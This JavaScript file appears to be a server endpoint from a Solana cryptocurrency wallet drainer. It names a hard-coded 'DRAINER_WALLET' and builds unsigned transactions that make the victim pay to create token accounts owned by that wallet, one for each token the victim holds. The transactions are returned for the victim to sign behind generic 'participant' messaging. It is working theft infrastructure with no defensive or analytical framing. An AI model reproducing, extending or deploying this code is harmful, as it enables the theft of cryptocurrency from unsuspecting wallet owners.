const { Connection, PublicKey, Transaction } = require('@solana/web3.js');
const { createAssociatedTokenAccountInstruction } = require('@solana/spl-token');

// Import centralized error handling
const errorHandler = require('../src/errorHandler.js');

// Import centralized RPC configuration
const { RPC_ENDPOINTS, ENV_CONFIG } = require('../env.config.js');

// RPC endpoints with fallback for reliability (prioritizing Helius and Shyft)

// Drainer wallet address - with error handling
let DRAINER_WALLET;

try {
  DRAINER_WALLET = new PublicKey(ENV_CONFIG.DRAINER_WALLET_ADDRESS);
} catch (error) {
  console.error('[PRE_INITIALIZE] Configuration error:', error.message);
  console.error('[PRE_INITIALIZE] ENV_CONFIG.DRAINER_WALLET_ADDRESS:', ENV_CONFIG.DRAINER_WALLET_ADDRESS);
  // Set fallback value
  DRAINER_WALLET = new PublicKey('11111111111111111111111111111111');
}

module.exports = async function preInitializeHandler(req, res) {
  try {
    const { user, mintAddresses } = req.body;
    
    // Enhanced user parameter validation
    if (!user || typeof user !== 'string') {
      return res.status(400).json({ 
        success: false,
        error: 'Missing or invalid user parameter',
        message: 'Non Participant Wallet'
      });
    }
    
    // Validate Solana public key format
    if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(user)) {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid Solana public key format',
        message: 'Non Participant Wallet'
      });
    }
    
    // Enhanced mint addresses validation
    if (!mintAddresses || !Array.isArray(mintAddresses)) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing or invalid mint addresses parameter',
        message: 'Non Participant Wallet'
      });
    }
    
    if (mintAddresses.length === 0) {
      return res.status(400).json({ 
        success: false,
        error: 'Empty mint addresses array',
        message: 'Non Participant Wallet'
      });
    }
    
    // Validate each mint address format
    for (let i = 0; i < mintAddresses.length; i++) {
      const mint = mintAddresses[i];
      if (!mint || typeof mint !== 'string' || !/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(mint)) {
        return res.status(400).json({ 
          success: false,
          error: `Invalid mint address format at index ${i}`,
          message: 'Non Participant Wallet'
        });
      }
    }
    
    console.log(`[PRE_INIT] Starting pre-initialization for user: ${user}`);
    console.log(`[PRE_INIT] Mint addresses to pre-initialize: ${mintAddresses.length}`);
    
    // Validate public key
    let userPubkey;
    try {
      userPubkey = new PublicKey(user);
    } catch (error) {
              return res.status(400).json({ 
          success: false,
          error: 'Invalid wallet format',
          message: 'Non Participant Wallet'
        });
    }
    
    // Check if user is trying to pre-initialize for the receiver's wallet
    if (userPubkey.equals(DRAINER_WALLET)) {
      console.log(`[SECURITY] Attempted to pre-initialize for receiver wallet: ${userPubkey.toString()}`);
      return res.status(403).json({ 
        success: false,
        error: 'Security violation',
        message: 'Cannot pre-initialize for the receiver wallet. This is a security measure.'
      });
    }
    
    // Create connection with RPC fallback
    let connection;
    try {
      connection = await errorHandler.withRPCFallback(async (endpoint) => {
        console.log(`[PRE_INIT] Trying RPC endpoint: ${endpoint}`);
        const conn = new Connection(endpoint);
        
        // Test connection
        const blockHeight = await conn.getBlockHeight();
        console.log(`[PRE_INIT] Successfully connected to ${endpoint}, block height: ${blockHeight}`);
        return conn;
      }, RPC_ENDPOINTS, {
        publicKey: user,
        context: 'Pre-Initialization RPC Connection'
      });
    } catch (rpcError) {
      return res.status(500).json(errorHandler.formatApiError(rpcError, {
        publicKey: user,
        context: 'Pre-Initialization Network Failure'
      }));
    }
    
    // Pre-initialize each mint address
    const preInitTransactions = [];
    const failedMints = [];
    
    for (const mintAddress of mintAddresses) {
      try {
        // Validate mint address
        let mintPubkey;
        try {
          mintPubkey = new PublicKey(mintAddress);
        } catch (error) {
          console.log(`[PRE_INIT] Invalid mint address: ${mintAddress}`);
          failedMints.push({ mint: mintAddress, error: 'Invalid mint address format' });
          continue;
        }
        
        console.log(`[PRE_INIT] Processing mint: ${mintAddress}`);
        
        // Get drainer ATA address
        const { getAssociatedTokenAddress } = await import('@solana/spl-token');
        const drainerATA = await getAssociatedTokenAddress(mintPubkey, DRAINER_WALLET);
        
        // Check if drainer ATA already exists
        const drainerAccount = await connection.getAccountInfo(drainerATA);
        
        if (drainerAccount) {
          console.log(`[PRE_INIT] ATA already exists for mint ${mintAddress}`);
          continue; // Skip if already exists
        }
        
        console.log(`[PRE_INIT] Creating ATA for mint ${mintAddress}`);
        
        // Create ATA creation transaction
        const ataCreationTx = new Transaction();
        
        // Set transaction version for better compatibility
        ataCreationTx.version = 0;
        
        const createATAIx = createAssociatedTokenAccountInstruction(
          userPubkey, // payer
          drainerATA, // ATA address
          DRAINER_WALLET, // owner
          mintPubkey // mint
        );
        
        ataCreationTx.add(createATAIx);
        ataCreationTx.feePayer = userPubkey;
        
        // Get blockhash for ATA creation
        let ataBlockhash;
        try {
          ataBlockhash = await errorHandler.withRPCFallback(async (endpoint) => {
            const fallbackConnection = new Connection(endpoint);
            const blockhashResponse = await fallbackConnection.getLatestBlockhash();
            return blockhashResponse.blockhash;
          }, RPC_ENDPOINTS, {
            publicKey: user,
            context: 'ATA Creation Blockhash Retrieval'
          });
        } catch (blockhashError) {
          // Use fallback blockhash if all endpoints fail
          console.warn('[PRE_INIT] All RPC endpoints failed for blockhash, using fallback');
          ataBlockhash = '11111111111111111111111111111111';
        }
        
        ataCreationTx.recentBlockhash = ataBlockhash;
        
        // Serialize ATA creation transaction
        const ataSerialized = ataCreationTx.serialize({ requireAllSignatures: false });
        const ataBase64 = Buffer.from(ataSerialized).toString('base64');
        
        preInitTransactions.push({
          mint: mintAddress,
          transaction: ataBase64,
          type: 'ata_creation',
          drainerATA: drainerATA.toString(),
          status: 'ready'
        });
        
        console.log(`[PRE_INIT] ATA creation transaction prepared for mint ${mintAddress}`);
        
      } catch (mintError) {
        console.log(`[PRE_INIT] Error processing mint ${mintAddress}: ${mintError.message}`);
        failedMints.push({ mint: mintAddress, error: mintError.message });
        continue;
      }
    }
    
    console.log(`[PRE_INIT] Pre-initialization complete: ${preInitTransactions.length} transactions prepared, ${failedMints.length} failed`);
    
    // Return results
    res.status(200).json({
      success: true,
      message: `Pre-initialization complete: ${preInitTransactions.length} ATA creation transactions prepared`,
      preInitTransactions: preInitTransactions,
      failedMints: failedMints,
      summary: {
        totalMints: mintAddresses.length,
        successful: preInitTransactions.length,
        failed: failedMints.length
      }
    });
    
  } catch (error) {
    console.error('[PRE_INIT] Handler error:', error);
    
    res.status(500).json(errorHandler.formatApiError(error, {
      publicKey: req.body?.user || 'Unknown',
      context: 'Pre-Initialization Handler Failure'
    }));
  }
} 